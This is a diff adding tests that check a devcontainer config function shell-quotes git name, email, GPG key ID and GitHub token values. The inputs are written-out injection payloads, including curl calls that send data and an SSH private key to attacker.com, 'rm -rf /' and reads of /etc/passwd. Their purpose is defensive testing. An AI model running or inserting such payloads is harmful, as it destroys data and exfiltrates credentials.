@@ -422,3 +422,138 @@ def describe_ssh_mount_warning():
             assert "WARNING" in captured.err
             assert "SSH key specified" in captured.err
             assert "docker rm -f abc123" in captured.err
+
+
+def describe_shell_injection_protection():
+    """Tests for shell injection protection in modify_config."""
+
+    def it_escapes_single_quotes_in_git_user_name(tmp_path: Path):
+        """Should escape single quotes in git user name to prevent injection."""
+        args = argparse.Namespace(
+            build=False,
+            ssh_key_file=None,
+            gpg_key_id=None,
+            gh_token=None,
+            git_user_name="O'Reilly",
+            git_user_email=None,
+        )
+        config = {"mounts": []}
+        result = modify_config(config, args, tmp_path)
+
+        # shlex.quote wraps in single quotes and escapes internal quotes
+        # "O'Reilly" becomes "'O'\"'\"'Reilly'"
+        assert "O'Reilly" not in result["postStartCommand"] or "\"'\"" in result["postStartCommand"]
+        # Verify the command won't break shell parsing
+        assert result["postStartCommand"].count("'") % 2 == 0 or "\"'\"" in result["postStartCommand"]
+
+    def it_escapes_command_injection_in_git_user_name(tmp_path: Path):
+        """Should prevent command injection via git user name."""
+        import shlex
+        malicious = "'; curl attacker.com/exfil; echo '"
+        args = argparse.Namespace(
+            build=False,
+            ssh_key_file=None,
+            gpg_key_id=None,
+            gh_token=None,
+            git_user_name=malicious,
+            git_user_email=None,
+        )
+        config = {"mounts": []}
+        result = modify_config(config, args, tmp_path)
+
+        # The malicious payload should be properly quoted by shlex.quote
+        # Verify the exact safe quoting is used
+        expected_quoted = shlex.quote(malicious)
+        assert f"git config --global user.name {expected_quoted}" in result["postStartCommand"]
+
+    def it_escapes_command_injection_in_git_user_email(tmp_path: Path):
+        """Should prevent command injection via git user email."""
+        import shlex
+        malicious = "user@example.com'; rm -rf /; echo '"
+        args = argparse.Namespace(
+            build=False,
+            ssh_key_file=None,
+            gpg_key_id=None,
+            gh_token=None,
+            git_user_name=None,
+            git_user_email=malicious,
+        )
+        config = {"mounts": []}
+        result = modify_config(config, args, tmp_path)
+
+        # The malicious payload should be properly quoted by shlex.quote
+        expected_quoted = shlex.quote(malicious)
+        assert f"git config --global user.email {expected_quoted}" in result["postStartCommand"]
+
+    def it_escapes_command_injection_in_gpg_key_id(tmp_path: Path):
+        """Should prevent command injection via GPG key ID."""
+        import shlex
+        malicious = "ABCD1234'; cat /etc/passwd; echo '"
+        args = argparse.Namespace(
+            build=False,
+            ssh_key_file=None,
+            gpg_key_id=malicious,
+            gh_token=None,
+            git_user_name=None,
+            git_user_email=None,
+        )
+        config = {"mounts": []}
+        result = modify_config(config, args, tmp_path)
+
+        # The malicious payload should be properly quoted by shlex.quote
+        expected_quoted = shlex.quote(malicious)
+        assert f"git config --global user.signingkey {expected_quoted}" in result["postStartCommand"]
+
+    def it_escapes_command_injection_in_gh_token(tmp_path: Path):
+        """Should prevent command injection via GitHub token."""
+        import shlex
+        malicious = "ghp_xxxx'; curl attacker.com?token=$(cat ~/.ssh/id_rsa); echo '"
+        args = argparse.Namespace(
+            build=False,
+            ssh_key_file=None,
+            gpg_key_id=None,
+            gh_token=malicious,
+            git_user_name=None,
+            git_user_email=None,
+        )
+        config = {"mounts": []}
+        result = modify_config(config, args, tmp_path)
+
+        # The malicious payload should be properly quoted by shlex.quote
+        expected_quoted = shlex.quote(malicious)
+        assert f"echo {expected_quoted} | gh auth login --with-token" in result["postStartCommand"]
+
+    def it_handles_backticks_in_values(tmp_path: Path):
+        """Should escape backticks to prevent command substitution."""
+        malicious = "`whoami`"
+        args = argparse.Namespace(
+            build=False,
+            ssh_key_file=None,
+            gpg_key_id=None,
+            gh_token=None,
+            git_user_name=malicious,
+            git_user_email=None,
+        )
+        config = {"mounts": []}
+        result = modify_config(config, args, tmp_path)
+
+        # Backticks should be inside quotes, preventing execution
+        # shlex.quote handles this by wrapping in single quotes
+        assert "git config --global user.name '`whoami`'" in result["postStartCommand"]
+
+    def it_handles_dollar_command_substitution(tmp_path: Path):
+        """Should escape $() command substitution."""
+        malicious = "$(cat /etc/passwd)"
+        args = argparse.Namespace(
+            build=False,
+            ssh_key_file=None,
+            gpg_key_id=None,
+            gh_token=None,
+            git_user_name=malicious,
+            git_user_email=None,
+        )
+        config = {"mounts": []}
+        result = modify_config(config, args, tmp_path)
+
+        # $() should be inside single quotes, preventing execution
+        assert "git config --global user.name '$(cat /etc/passwd)'" in result["postStartCommand"]
